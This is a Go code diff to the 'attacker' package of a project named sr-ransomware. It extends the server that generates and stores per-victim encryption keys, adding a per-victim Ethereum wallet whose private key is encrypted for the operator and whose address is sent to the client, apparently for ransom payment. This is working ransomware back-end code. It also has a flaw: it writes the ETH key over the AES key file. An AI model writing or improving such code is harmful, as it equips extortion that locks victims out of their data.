@@ -2,6 +2,7 @@ package attacker
 
 import (
     "os"
+    "io"
     "unsafe"
     "runtime"
     "net/http"
@@ -17,6 +18,7 @@ import (
 
     "github.com/sug0/sr-ransomware/go/errors"
     "github.com/sug0/sr-ransomware/go/crypto/util"
+    ethereum "github.com/ethereum/go-ethereum/crypto"
 )
 
 //go:generate go run generate/key.go
@@ -27,6 +29,7 @@ type Oracle struct {
 }
 
 type Keys struct {
+    Wallet string
     Public []byte
     Secret []byte
 }
@@ -54,8 +57,13 @@ func (o *Oracle) ServeHTTP(w http.ResponseWriter, r *http.Request) {
         return
     }
 
-    var size int64
     w.Header().Set("Content-Disposition", `attachment; filename="keys.bin"`)
+
+    // write wallet addr
+    io.WriteString(w, keys.Wallet)
+
+    // write keys
+    var size int64
 
     size = int64(len(keys.Public))
     binary.Write(w, binary.BigEndian, &size)
@@ -75,6 +83,10 @@ func (o *Oracle) GenerateAndStoreKeys() (*Keys, error) {
     aesIVKey, err := util.GenerateIVandKeyAES()
     if err != nil {
         return nil, errors.Wrap(pkg, "failed to generate AES", err)
+    }
+    eth, err := ethereum.GenerateKey()
+    if err != nil {
+        return nil, errors.Wrap(pkg, "failed to generate ETH key", err)
     }
 
     // export public key
@@ -101,19 +113,38 @@ func (o *Oracle) GenerateAndStoreKeys() (*Keys, error) {
         return nil, errors.Wrap(pkg, "failed to encrypt AES key", err)
     }
 
+    // encrypt eth key
+    ethEncrypted, err := rsa.EncryptPKCS1v15(rand.Reader, o.key, ethereum.FromECDSA(eth))
+    if err != nil {
+        return nil, errors.Wrap(pkg, "failed to encrypt ETH key", err)
+    }
+
     // calc hash digest of public key
     var hexdigest [2*sha1.Size]byte
     digest := sha1.Sum(pkData)
 
     hex.Encode(hexdigest[:], digest[:])
     d := hexdigest[:]
-    ds := (*string)(unsafe.Pointer(&d))
+    ds := *(*string)(unsafe.Pointer(&d))
 
-    // write aes key
-    err = ioutil.WriteFile(filepath.Join(o.path, *ds), aesEncrypted, 0644)
-
+    // create directory for keys
+    err = os.Mkdir(filepath.Join(o.path, ds), os.ModePerm)
     if err != nil {
-        return nil, errors.Wrap(pkg, "failed to encrypt AES key", err)
+        return nil, errors.Wrap(pkg, "failed to create dir", err)
     }
-    return &Keys{pkData, skData}, nil
+
+    // write aes and eth keys
+    err = ioutil.WriteFile(filepath.Join(o.path, ds, "aes"), aesEncrypted, 0600)
+    if err != nil {
+        return nil, errors.Wrap(pkg, "failed to save AES key", err)
+    }
+
+    err = ioutil.WriteFile(filepath.Join(o.path, ds, "aes"), ethEncrypted, 0600)
+    if err != nil {
+        return nil, errors.Wrap(pkg, "failed to save ETH key", err)
+    }
+
+    wallet := ethereum.PubkeyToAddress(eth.PublicKey)
+
+    return &Keys{wallet.Hex(), pkData, skData}, nil
 }
